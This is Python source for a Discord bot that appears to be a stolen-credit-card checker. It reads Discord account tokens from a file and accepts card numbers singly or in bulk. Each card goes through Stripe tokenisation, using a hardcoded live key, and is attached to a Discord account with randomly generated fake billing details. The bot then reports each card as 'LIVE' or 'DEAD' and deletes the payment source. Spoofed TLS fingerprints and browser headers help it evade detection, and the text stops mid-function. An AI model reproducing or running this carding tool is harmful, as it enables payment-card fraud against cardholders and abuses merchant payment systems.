import string
import discord
import re
import requests
import random
from colorama import Fore
import uuid
from uuid import uuid4
import requests
from time import time
from parse import parse
import re
import random
import json
import string
import tls_client
from bs4 import BeautifulSoup
import time
from requests.auth import HTTPProxyAuth
import webbrowser
import threading
import queue
from colorama import Fore
import time
import queue

TOKEN = 'bot token here'
BLACKLISTED = [] # blacklisted bins 
def get_valid_token(tokens_file):
    with open(tokens_file, 'r') as file:
        tokens = [line.strip() for line in file if line.strip()]

    while tokens:
        token = random.choice(tokens)
        headers = {"Authorization": token}
        response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
        
        if response.status_code != 401:
            return token
        else:
            tokens.remove(token)
    
    raise Exception("No valid tokens found.")

token = get_valid_token('tokens.txt')

letters = string.ascii_lowercase
First = ''.join(random.choice(letters) for _ in range(6))
Last = ''.join(random.choice(letters) for _ in range(6))
PWD = ''.join(random.choice(letters) for _ in range(10))
Name = f'{First}+{Last}'
Email = f'{First}.{Last}@gmail.com'
UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'

intents = discord.Intents.all()
bot = discord.Bot(intents=intents)

def getInfo(country):
    abbv = {
        'Alabama': 'AL', 'Alaska': 'AK', 'Arizona': 'AZ', 'Arkansas': 'AR', 'California': 'CA',
        'Colorado': 'CO', 'Connecticut': 'CT', 'Delaware': 'DE', 'Florida': 'FL', 'Georgia': 'GA',
        'Hawaii': 'HI', 'Idaho': 'ID', 'Illinois': 'IL', 'Indiana': 'IN', 'Iowa': 'IA',
        'Kansas': 'KS', 'Kentucky': 'KY', 'Louisiana': 'LA', 'Maine': 'ME', 'Maryland': 'MD',
        'Massachusetts': 'MA', 'Michigan': 'MI', 'Minnesota': 'MN', 'Mississippi': 'MS', 'Missouri': 'MO',
        'Montana': 'MT', 'Nebraska': 'NE', 'Nevada': 'NV', 'New Hampshire': 'NH', 'New Jersey': 'NJ',
        'New Mexico': 'NM', 'New York': 'NY', 'North Carolina': 'NC', 'North Dakota': 'ND', 'Ohio': 'OH',
        'Oklahoma': 'OK', 'Oregon': 'OR', 'Pennsylvania': 'PA', 'Rhode Island': 'RI', 'South Carolina': 'SC',
        'South Dakota': 'SD', 'Tennessee': 'TN', 'Texas': 'TX', 'Utah': 'UT', 'Vermont': 'VT',
        'Virginia': 'VA', 'Washington': 'WA', 'West Virginia': 'WV', 'Wisconsin': 'WI', 'Wyoming': 'WY'
    }
    
    response = requests.get(f'https://randomuser.me/api/?nat={country}')
    data = response.json()
    
    user = data['results'][0]
    cardName = f"{user['name']['first']} {user['name']['last']}"
    line_1 = f"{user['location']['street']['name']} {user['location']['street']['number']}"
    city = user['location']['city']
    state = user['location']['state']
    postalcode = user['location']['postcode']
    
    if country == 'US':
        state_abbr = abbv.get(state, state)
    else:
        state_abbr = state 
    
    return cardName, line_1, city, state_abbr, postalcode
def CookieFetch():
        
        headers = {
            'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEzLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjk5OTksImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
        }

        response = requests.get('https://discord.com/api/v9/experiments', headers=headers, proxies=None)

        return response.cookies

@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user}')
    
@bot.slash_command(name="bin", description="Lookup info on a bin")
async def chk(ctx, bin: str):
    j = False

    while True:
        session = tls_client.Session(random_tls_extension_order=True, client_identifier="chrome_113")
        
        session.headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36', 
            "Accept-Version": "3"
        }
        
        r = session.get(f"https://lookup.binlist.net/{bin}")
        try:
            response = r.json()
            j = True
        except:
            break
        
    if j == True:
        embed = discord.Embed(title=":information_source: Bin Lookup :information_source:")
        embed.description = "# Info"
        
        if 'scheme' in response:
            embed.add_field(name="Brand ➤ ", value=f"`{response['scheme']}`", inline=True)
        if 'type' in response:
            embed.add_field(name="Type ➤ ", value=f"`{response['type']}`", inline=True)
        if 'country' in response:
            if 'alpha2' in response['country']:
                embed.add_field(name="Country Code ➤ ", value=f"`{response['country']['alpha2']}`", inline=True)
            if 'name' in response['country']:
                embed.add_field(name="Country ➤ ", value=f"`{response['country']['name']}`", inline=True)
            if 'currency' in response['country']:
                embed.add_field(name="Currency ➤ ", value=f"`{response['country']['currency']}`", inline=True)
        if 'bank' in response and 'name' in response['bank']:
            embed.add_field(name="Bank ➤ ", value=f"`{response['bank']['name']}`", inline=True)
        
        embed.add_field(name="Bin ➤ ", value=f"`{bin}`", inline=True)
        embed.set_footer(text='Bot By https://t.me/csolver')
        
        try:
            await ctx.respond(embed=embed)
        except:
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title=":information_source: Bin Lookup :information_source:")
        embed.description = "# Bin Lookup Rate Limited"
        embed.set_footer(text='Bot By https://t.me/csolver')
        try:
            await ctx.respond(embed=embed)
        except:
            await ctx.send(embed=embed)

@bot.slash_command(name="mchk", description="Check if multiple cards are live or dead")
async def chk(ctx, country_code: str, cards: discord.Attachment):
    country = country_code
    cardName, line_1, city, state, postalcode = getInfo(country)

    if "1250668952229515265" in [str(role.id) for role in ctx.author.roles]:
        if cards.filename.endswith('.txt'):
            card_list = await cards.read()
            card_list = card_list.decode('utf-8').splitlines()
            results = []

            for card in card_list:
                time.sleep(2)
                if "|" in card:
                    ccn, expM, expY, cvv = card.strip().split('|')
                elif ":" in card:
                    ccn, expM, expY, cvv = card.strip().split(':')
                else:
                    embed = discord.Embed(title=":x: Error :x:")
                    embed.description = "Invalid Card Format"
                    embed.add_field(name="Correct Format ➤ ", value="`4242424242424242|06|09|123`", inline=True)
                    embed.add_field(name="Correct Format ➤ ", value="`4242424242424242:06:09:123`", inline=True)  
                    embed.set_footer(text='Bot By https://t.me/csolver') 
                    await ctx.respond(embed=embed)
                
                session = tls_client.Session(random_tls_extension_order=True, client_identifier="edg_122")
                    
                __header1 = {
                    'authority': 'api.stripe.com',
                    'Authorization' : 'Bearer pk_live_CUQtlpQUF0vufWpnpUmQvcdi',
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'referer': 'https://js.stripe.com/',
                    'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
                }
                    

                data = f'card[number]={ccn}&card[cvc]={cvv}&card[exp_month]={expM}&card[exp_year]={expY}&guid={uuid.uuid4()}&muid={uuid.uuid4()}&sid={uuid.uuid4}&payment_user_agent=stripe.js%2F28b7ba8f85%3B+stripe-js-v3%2F28b7ba8f85%3B+split-card-element&referrer=https%3A%2F%2Fdiscord.com&time_on_page=415638&key=pk_live_CUQtlpQUF0vufWpnpUmQvcdi&pasted_fields=number%2Ccvc'
                try:
                    response = session.post('https://api.stripe.com/v1/tokens', headers=__header1, data=data)
                except Exception as e:
                    embed = discord.Embed(title=":x: Error :x:")
                    embed.description = "# Failed To Post Request"
                    embed.add_field(name="Reason ➤ ", value="`{response.text}`", inline=True)
                    embed.add_field(name="Card ➤ ", value=f"`{card}`", inline=True)
                    embed.set_footer(text='Bot By https://t.me/csolver')
                    try:
                        await ctx.respond(embed=embed)
                    except:
                        await ctx.send(embed=embed)
                    return
                try:   
                    TokenCard = response.json()["id"]
                except Exception as e:
                    embed = discord.Embed(title=":x: DEAD :x:")
                    embed.description = "# Failed To Auth Card"
                    embed.add_field(name="Response ➤ ", value=f"`{response.text}`", inline=True)
                    embed.add_field(name="Card ➤ ", value=f"`{card}`", inline=True)
                    embed.set_footer(text='Bot By https://t.me/csolver')
                    try:
                        await ctx.respond(embed=embed)
                    except:
                        await ctx.send(embed=embed)
                
                __header2 = {
                'authority': 'discord.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': token,
                'origin': 'https://discord.com',
                'referer': 'https://discord.com/channels/@me',
                'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
                'x-debug-options': 'bugReporterEnabled',
                'x-discord-locale': 'en-US',
                'x-discord-timezone': 'Europe/Budapest',
                'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjIuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMjIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjY4NjAwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
            }
                try:
                    response = session.post('https://discord.com/api/v9/users/@me/billing/stripe/setup-intents', headers=__header2)
                except:
                    embed = discord.Embed(title=":x: ERROR :x:")
                    embed.description = "# Failed To Post Request"
                    embed.add_field(name="Reason ➤ ", value=f"`{response.text}`", inline=True)
                    embed.add_field(name="Card ➤ ", value=f"`{card}`", inline=True)
                    embed.set_footer(text='Bot By https://t.me/csolver')
                    try:
                        await ctx.respond(embed=embed)
                    except:
                        await ctx.send(embed=embed)
                try:
                    csTok = response.json()["client_secret"]
                    Stok = str(csTok).split('_secret_')[0]
                except Exception as e:  
                    embed = discord.Embed(title=":x: DEAD :x:")
                    embed.description = "# Failed To Auth Card"
                    embed.add_field(name="Response ➤ ", value=f"`{response.text}`", inline=True)
                    embed.add_field(name="Card ➤ ", value=f"`{card}`", inline=True)
                    embed.set_footer(text='Bot By https://t.me/csolver')
                    try:
                        await ctx.respond(embed=embed)
                    except:
                        await ctx.send(embed=embed)
                
                __header3 = {
                'authority': 'discord.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': token,
                'content-type': 'application/json',
                'origin': 'https://discord.com',
                'referer': 'https://discord.com/channels/@me',
                'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
                'x-debug-options': 'bugReporterEnabled',
                'x-discord-locale': 'en-US',
                'x-discord-timezone': 'Europe/Budapest',
                'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjIuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMjIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjY4NjAwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
            }
                
                jsonD = {
                'billing_address': {
                    'name': cardName,
                    'line_1': line_1,
                    'line_2': '',
                    'city': city,
                    'state': state,
                    'postal_code': postalcode,
                    'country': country,
                    'email': '',
                },
            }

                try:
                    response = session.post(
                'https://discord.com/api/v9/users/@me/billing/payment-sources/validate-billing-address',
                headers=__header3,
                json=jsonD
            )
                except Exception as e:
                    embed = discord.Embed(title=":x: ERROR :x:")
                    embed.description = "# Failed To Post Request"
                    embed.add_field(name="Reason ➤ ", value=f"`{response.text}`", inline=True)
                    embed.add_field(name="Card ➤ ", value=f"`{card}`", inline=True)
                    embed.set_footer(text='Bot By https://t.me/csolver')
                    try:
                        await ctx.respond(embed=embed)
                    except:
                        await ctx.send(embed=embed)
                try: 
                    BTok = response.json()["token"]
                except Exception as e:
                    embed = discord.Embed(title=":x: DEAD :x:")
                    embed.description = "# Failed To Auth Card"
                    embed.add_field(name="Response ➤ ", value=f"`{response.text}`", inline=True)
                    embed.add_field(name="Card ➤ ", value=f"`{card}`", inline=True)
                    embed.set_footer(text='Bot By https://t.me/csolver')
                    try:
                        await ctx.respond(embed=embed)
                    except:
                        await ctx.send(embed=embed)
                
                __header4 = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'Authorization': 'Bearer pk_live_CUQtlpQUF0vufWpnpUmQvcdi',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
            }    
                data = f'payment_method_data[type]=card&payment_method_data[card][token]={TokenCard}&payment_method_data[billing_details][address][line1]={line_1}&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][city]={city}&payment_method_data[billing_details][address][state]={state}&payment_method_data[billing_details][address][postal_code]={postalcode}&payment_method_data[billing_details][address][country]={country}&payment_method_data[billing_details][name]={cardName}&payment_method_data[guid]={uuid.uuid4()}&payment_method_data[muid]={uuid.uuid4()}&payment_method_data[sid]={uuid.uuid4()}&payment_method_data[payment_user_agent]=stripe.js%2F28b7ba8f85%3B+stripe-js-v3%2F28b7ba8f85&payment_method_data[referrer]=https%3A%2F%2Fdiscord.com&payment_method_data[time_on_page]=707159&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_CUQtlpQUF0vufWpnpUmQvcdi&client_secret={csTok}'
                try:
                    response = session.post(
                f'https://api.stripe.com/v1/setup_intents/{Stok}/confirm',
                headers=__header4,
                data=data
            )
                except Exception as e:
                    embed = discord.Embed(title=":x: ERROR :x:")
                    embed.description = "# Failed To Post Request"
                    embed.add_field(name="Reason ➤ ", value=f"`{response.text}`", inline=True)
                    embed.add_field(name="Card ➤ ", value=f"`{card}`", inline=True)
                    embed.set_footer(text='Bot By https://t.me/csolver')
                    try:
                        await ctx.respond(embed=embed)
                    except:
                        await ctx.send(embed=embed)
                    return
                try: 
                    CardSCMAIN = response.json()["id"]
                    pmTok = response.json()["payment_method"]
                except Exception as e:
                    if "Your card was declined." in response.text or "card_declined" in response.text or "generic_decline" in response.text:
                        embed = discord.Embed(title=":x: DEAD :x:")
                        embed.description = "# Failed To Auth Card"
                        embed.add_field(name="Response ➤ ", value=f"```Code: {response.json()['error']['code']}\nReason: {response.json()['error']['decline_code']}\nMessage: {response.json()['error']['message']}```", inline=True)
                        embed.set_footer(text='Bot By https://t.me/csolver')
                        try:
                            await ctx.respond(embed=embed)
                        except:
                            await ctx.send(embed=embed)
                        return 'F'
                
                    else:
                        embed = discord.Embed(title=":x: DEAD :x:")
                        embed.description = "# Failed To Auth Card"
                        embed.add_field(name="Response ➤ ", value=f"`{response.text}`", inline=True)
                        embed.set_footer(text='Bot By https://t.me/csolver')
                        try:
                            await ctx.respond(embed=embed)
                        except:
                            await ctx.send(embed=embed)
                        return 'F'
                
                header5 = {
                'authority': 'discord.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': token,
                'content-type': 'application/json',
                'origin': 'https://discord.com',
                'referer': 'https://discord.com/channels/@me',
                'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
                'x-debug-options': 'bugReporterEnabled',
                'x-discord-locale': 'en-US',
                'x-discord-timezone': 'Europe/Budapest',
                'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjIuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMjIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjY4NjAwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
            }

                jsonD2 = {
                'payment_gateway': 1,
                'token': pmTok,
                'billing_address': {
                    'name': cardName,
                    'line_1': line_1,
                    'line_2': None,
                    'city': city,
                    'state': state,
                    'postal_code': postalcode,
                    'country': country,
                    'email': '',
                },
                'billing_address_token': BTok
            }
                
                try:
                    response = session.post(
                'https://discord.com/api/v9/users/@me/billing/payment-sources',
                headers=header5,
                json=jsonD2
            )
                except Exception as e:
                    embed = discord.Embed(title=":x: ERROR :x:")
                    embed.description = "# Failed To Post Request"
                    embed.add_field(name="Reason ➤ ", value=f"`{response.text}`", inline=True)
                    embed.add_field(name="Card ➤ ", value=f"`{card}`", inline=True)
                    embed.set_footer(text='Bot By https://t.me/csolver')
                    try:
                        await ctx.respond(embed=embed)
                    except:
                        await ctx.send(embed=embed)
                
                try:
                    purchaseId = response.json()["id"]
                    results.append(card)
                    if len(results) > 1:
                        embed = discord.Embed(title=":white_check_mark: LIVE :white_check_mark: ")
                        embed.description = "# Successfully Authed Cards"
                        embed.add_field(name="Response ➤ ", value=f"`{response.text}`", inline=True)
                        embed.add_field(name="Card ➤ ", value=f"`{card}`", inline=True)
                        embed.set_footer(text='Bot By https://t.me/csolver')
                    else: 
                        embed = discord.Embed(title=":white_check_mark: LIVE :white_check_mark: ")
                        embed.description = "# Successfully Authed Card"
                        embed.add_field(name="Response ➤ ", value=f"`{response.text}`", inline=True)
                        embed.add_field(name="Card ➤ ", value=f"`{card}`", inline=True)
                        embed.set_footer(text='Bot By https://t.me/csolver')
                    try:
                        await ctx.respond(embed=embed)
                    except:
                        await ctx.send(embed=embed)
                    
                    __rcookie = CookieFetch()

                    cookies = {
                        '__dcfduid': __rcookie.get('__dcfduid'),
                        '__sdcfduid': __rcookie.get('__sdcfduid'),
                        '__cfruid': __rcookie.get('__cfruid'),
                        'locale': 'en-US',
                    }
                    
                    __headers = {
                        'authority': 'discord.com',
                        'accept': '*/*',
                        'accept-language': 'en-US,en;q=0.9',
                        'authorization': token,
                        'origin': 'https://discord.com',
                        'referer': 'https://discord.com/channels/@me/1209553062172172372',
                        'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
                        'x-debug-options': 'bugReporterEnabled',
                        'x-discord-locale': 'en-US',
                        'x-discord-timezone': 'Europe/Budapest',
                        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjIuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMjIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6Imh0dHBzOi8vZGlzY29yZC5jb20vP2Rpc2NvcmR0b2tlbj1NVEEzTURReU56RXhNVGM1TVRJNE5ESTROQS5HYWNhYnIuVE9NZUVzbHdiczJ2OFRlck4wOTM3SzVvS0ZFMFZyZW5fdWF6Q1kiLCJyZWZlcnJpbmdfZG9tYWluIjoiZGlzY29yZC5jb20iLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjY5MTY2LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
                    }
                    responsez = session.delete(
                        f'https://discord.com/api/v9/users/@me/billing/payment-sources/{purchaseId}',
                        headers=__headers, cookies=cookies
                    )
                    if responsez.status_code == 204:
                        return 'S'
                    else: 
                        return responsez.json() 
                    
                except Exception as e:
                    if 'captcha_key' in str(response.json()):
                        embed = discord.Embed(title=":x: ERROR :x:")
                        embed.description = "# Captcha Error"
                        embed.add_field(name="Response ➤ ", value=f"`{response.text}`", inline=True)
                        embed.add_field(name="Card ➤ ", value=f"`{card}`", inline=True)

                        embed.set_footer(text='Bot By https://t.me/csolver')
                        try:
                            await ctx.respond(embed=embed)
                        except:
                            await ctx.send(embed=embed)
                    
            else:
                embed = discord.Embed(title=":x: ERROR :x:")
                embed.description = "# UNAUTHORIZED"
                embed.add_field(name="You Need The `MChexer` Role! ➤ ", value=f"`Please create a <#1250258563960668190> to get this role!`", inline=True)
                embed.set_footer(text='Bot By https://t.me/csolver')
                try:
                    await ctx.respond(embed=embed)
                except:
                    await ctx.send(embed=embed)
                
@bot.slash_command(name="chk", description="Check if a card is live or dead")
async def chk(ctx, *, card: str, country_code: str):
        country = country_code
        cardName, line_1, city, state, postalcode = getInfo(country)
        
        if ':' in card:
            
            ccn = card.split(':')[0]

            expMa = card.split(':')[1]

            expM = expMa[:2]

            expY = expMa[2:]

            cvv = card.split(':')[2]
            
        elif '|' in card:
            
            ccn, expM, expY, cvv = card.split('|')
            
        else:
            embed = discord.Embed(title=":x: Error :x:")
            embed.description = "Invalid Card Format"
            embed.add_field(name="Correct Format ➤ ", value="`4242424242424242|06|09|123`", inline=True)
            embed.add_field(name="Correct Format ➤ ", value="`4242424242424242:06:09:123`", inline=True) 
            embed.set_footer(text='Bot By https://t.me/csolver')  
            try:
                await ctx.respond(embed=embed)
            except:
                await ctx.send(embed=embed)
        
        session = tls_client.Session(random_tls_extension_order=True, client_identifier="edg_122")
            
        __header1 = {
            'authority': 'api.stripe.com',
            'Authorization' : 'Bearer pk_live_CUQtlpQUF0vufWpnpUmQvcdi',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
        }
            

        data = f'card[number]={ccn}&card[cvc]={cvv}&card[exp_month]={expM}&card[exp_year]={expY}&guid={uuid.uuid4()}&muid={uuid.uuid4()}&sid={uuid.uuid4}&payment_user_agent=stripe.js%2F28b7ba8f85%3B+stripe-js-v3%2F28b7ba8f85%3B+split-card-element&referrer=https%3A%2F%2Fdiscord.com&time_on_page=415638&key=pk_live_CUQtlpQUF0vufWpnpUmQvcdi&pasted_fields=number%2Ccvc'
        try:
            response = session.post('https://api.stripe.com/v1/tokens', headers=__header1, data=data)
        except Exception as e:
            embed = discord.Embed(title=":x: Error :x:")
            embed.description = "# Failed To Post Request"
            embed.add_field(name="Reason ➤ ", value="`{response.text}`", inline=True)
            embed.set_footer(text='Bot By https://t.me/csolver')
            
            try:
                await ctx.respond(embed=embed)
            except:
                await ctx.send(embed=embed)
            return
        try:   
            TokenCard = response.json()["id"]
        except Exception as e:
            embed = discord.Embed(title=":x: DEAD :x:")
            embed.description = "# Failed To Auth Card"
            embed.add_field(name="Response ➤ ", value=f"`{response.text}`", inline=True)
            embed.set_footer(text='Bot By https://t.me/csolver')
            try:
                await ctx.respond(embed=embed)
            except:
                await ctx.send(embed=embed)
            return 'F'
        
        __header2 = {
            'authority': 'discord.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': token,
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/channels/@me',
            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
            'x-discord-timezone': 'Europe/Budapest',
